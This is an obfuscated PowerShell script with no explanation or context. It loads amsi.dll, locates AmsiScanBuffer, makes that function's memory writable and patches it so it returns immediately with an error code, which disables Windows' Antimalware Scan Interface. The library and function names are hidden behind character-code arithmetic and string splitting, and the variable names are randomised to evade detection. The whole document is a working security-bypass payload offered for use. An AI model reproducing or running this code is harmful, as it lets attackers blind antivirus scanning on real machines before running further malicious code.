$VseuczlWLI7E = @"
using System;
using System.Runtime.InteropServices;
public class VseuczlWLI7E {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr FAv, string dm2eEVOF4NFkiYXScAgF);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr tSdEuqvOMYyhStL, UIntPtr UxLyAiZJxLlwMDkk7n, uint GqIwxCnwpGlnSY, out uint fgUPUXsL);
}
"@

Add-Type $VseuczlWLI7E

$TXwVKUgfK3zwEaT = [VseuczlWLI7E]::LoadLibrary("$(('ám'+'sî'+'.d'+'ll').noRMALizE([cHAr]([BYTE]0x46)+[chAr]([byTe]0x6f)+[cHAr](63+51)+[ChAr](109+60-60)+[Char](40+28)) -replace [CHaR](92*27/27)+[chAR]([BytE]0x70)+[ChaR]([BYTe]0x7b)+[cHaR]([BytE]0x4d)+[chAr](110+59-59)+[ChAr](105+20))")
$BHEiG3a4_IFfmawR = [VseuczlWLI7E]::GetProcAddress($TXwVKUgfK3zwEaT, "$([ChAR]([Byte]0x41)+[cHAR]([bytE]0x6d)+[Char](115)+[chaR](27+78)+[Char]([BYTE]0x53)+[ChAr](99*32/32)+[cHAR]([BYTe]0x61)+[ChAR](110)+[ChAr](66+56-56)+[CHAR]([BYte]0x75)+[CHaR]([BYTE]0x66)+[CHaR](102+94-94)+[cHar]([BYTE]0x65)+[cHar](114*85/85))")
$p = 0
[VseuczlWLI7E]::VirtualProtect($BHEiG3a4_IFfmawR, [uint32]5, 0x40, [ref]$p)
$y5oGn86WbqTPAAE3v = "0xB8"
$J92ra4Elg = "0x57"
$tQOgIwxb = "0x00"
$qlhRMmXBcR = "0x07"
$vnA_acxyHXTZUmzkiHRG = "0x80"
$t49Q = "0xC3"
$t6LkWdVWowmRDUi5K4 = [Byte[]] ($y5oGn86WbqTPAAE3v,$J92ra4Elg,$tQOgIwxb,$qlhRMmXBcR,+$vnA_acxyHXTZUmzkiHRG,+$t49Q)
[System.Runtime.InteropServices.Marshal]::Copy($t6LkWdVWowmRDUi5K4, 0, $BHEiG3a4_IFfmawR, 6)